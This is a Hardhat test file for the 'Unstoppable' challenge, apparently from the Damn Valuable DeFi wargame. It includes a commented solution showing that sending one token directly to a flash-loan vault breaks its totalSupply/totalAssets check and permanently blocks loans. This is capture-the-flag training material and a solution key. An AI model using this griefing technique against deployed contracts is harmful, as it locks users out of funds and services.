const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, player, someUser;
    let token, vault, receiverContract;

    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
    const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, player, someUser] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        vault = await (await ethers.getContractFactory('UnstoppableVault', deployer)).deploy(
            token.address,
            deployer.address, // owner
            deployer.address // fee recipient
        );
        expect(await vault.asset()).to.eq(token.address);

        await token.approve(vault.address, TOKENS_IN_VAULT);
        await vault.deposit(TOKENS_IN_VAULT, deployer.address);

        expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
        expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
        expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
        expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
        expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
        expect(
            await vault.flashFee(token.address, TOKENS_IN_VAULT)
        ).to.eq(50000n * 10n ** 18n);

        await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        receiverContract = await (await ethers.getContractFactory('ReceiverUnstoppable', someUser)).deploy(
            vault.address
        );
        await receiverContract.executeFlashLoan(100n * 10n ** 18n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Henryk: Info about the UnstoppableVault:
        // * In the "flashLoan" method there is a check to see if totalSupply != totalAssets
        // * "totalSupply" and "totalAssets" will increment if you "deposit" into the vault
        // * "totalAssets" will increase if you do a traditional ERC20 "transfer" to the UnstoppableVault smart contract

        // Henryk: The below four lines of code are just commented out to show how a deposit would work. First an
        // "approve" is called to allow the UnstoppableVault to transfer the tokens. The two assertions to 
        // just check that the "totalSupply" and "totalAssets" are the same
        // await token.approve(vault.address, 1n);
        // await vault.deposit(1n, deployer.address);
        // expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT + 1n);
        // expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT + 1n);

        // Henryk: Goal is to make the tokenized vault stop being able to execute
        // flash loans
        
        // Henryk Exploit Plan: 
        // 1. In the "flashLoan" method there is a check to see if totalSupply != totalAssets. 
        // What I am doing here is simply just sending over 1 token to the flash loan by doing
        // an ERC20 "transfer" to get this conditional to fail altogether. 

        await token.connect(player).transfer(vault.address, 1n);

        // Henryk: I am just doing an assertion to make sure that "totalAssets" aka balanceOf" the token was incremented
        // while "totalSupply" did not increase
        expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
        expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT + 1n);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        await expect(
            receiverContract.executeFlashLoan(100n * 10n ** 18n)
        ).to.be.reverted;
    });
});
